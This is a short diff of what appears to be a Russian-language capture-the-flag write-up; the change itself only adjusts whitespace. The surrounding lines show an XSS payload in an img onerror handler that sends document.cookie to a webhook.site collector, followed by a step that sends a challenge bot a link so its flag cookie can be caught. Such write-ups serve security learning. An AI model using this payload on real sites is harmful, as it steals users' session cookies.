@@ -25,7 +25,8 @@ if (preg_match('/^[a-zA-Z0-9_]{0,30}+$/m', $filename) !== 1) {
 ```
 <img src onerror="window.location.replace('https://webhook.site/<webhook>?a='+document.cookie)">
 ``` 
-для получения ```cookie```. 
+для получения ```cookie```.
+
 6. Отправляем боту ссылку ```http://bigsmokepages.vkactf.ru/evil.html``` и ловим на веб хук флаг, находящийся у него в куках.
 
 
